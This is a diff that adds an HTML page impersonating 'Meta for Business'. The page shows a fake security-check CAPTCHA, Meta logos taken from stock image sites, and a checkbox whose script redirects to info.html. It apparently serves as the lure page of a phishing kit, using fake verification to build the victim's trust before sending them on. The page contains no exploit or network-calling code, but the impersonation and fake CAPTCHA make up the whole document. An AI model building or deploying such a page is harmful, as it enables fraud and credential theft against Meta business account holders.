@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta for Business - Security Check</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            width: 502px;
+            height: 819px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+        .container img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+        }
+        .title-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin: 20px 0;
+            font-size: 24px;
+        }
+        .title-container img {
+            height: 40px;
+        }
+        .title-container h2 {
+            font-size: 28px;
+            color: #1c1e21;
+            margin: 0;
+        }
+        .description {
+            font-size: 16px;
+            color: #606770;
+            margin: 20px 0;
+            line-height: 1.6;
+        }
+        .captcha-container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #f9f9f9;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            padding: 15px;
+            margin: 40px 0;
+            height: 60px;
+        }
+        .captcha-checkbox {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #ccc;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .captcha-label {
+            font-size: 16px;
+            color: #333;
+            cursor: pointer;
+            margin-left: 10px;
+        }
+        .captcha-icon {
+            width: 20px;
+            height: 20px;
+        }
+        .button {
+            width: 100%;
+            padding: 12px;
+            background-color: #d3d3d3;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: not-allowed;
+            margin-top: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://img.freepik.com/premium-vector/teamwork-partnership-concept-business-team-partners-connecting-puzzle-matching-jigsaw-pieces-together-synergy-union-success-cooperation-flat-vector-illustration-isolated-white-background_198278-23691.jpg" alt="Teamwork Illustration">
+        <div class="title-container">
+            <img src="https://cdn.pixabay.com/photo/2021/12/14/22/29/meta-6871457_1280.png" alt="Meta Logo">
+            <h2>Meta For Business</h2>
+        </div>
+        <h3>Security Check</h3>
+        <p class="description">
+            Meta uses security tests to ensure that the people on the sites are real. 
+            Please fill the security check below to continue further.
+        </p>
+        <div class="captcha-container">
+            <input type="checkbox" id="human-check" class="captcha-checkbox" onclick="enableButton()">
+            <label for="human-check" class="captcha-label">I am human</label>
+            <img src="https://cdn-icons-png.flaticon.com/512/2879/2879443.png" alt="CAPTCHA Icon" class="captcha-icon">
+        </div>
+        <button id="continue-button" class="button" disabled>Continue</button>
+    </div>
+
+    <script>
+        function enableButton() {
+            const checkbox = document.getElementById('human-check');
+            const button = document.getElementById('continue-button');
+            button.disabled = !checkbox.checked;
+            button.style.cursor = checkbox.checked ? 'pointer' : 'not-allowed';
+            button.style.backgroundColor = checkbox.checked ? '#007bff' : '#d3d3d3';
+            
+            if (checkbox.checked) {
+                button.onclick = function() {
+                    window.location.href = 'info.html';  // Redirect to info.html
+                };
+            }
+        }
+    </script>
+</body>
+</html>
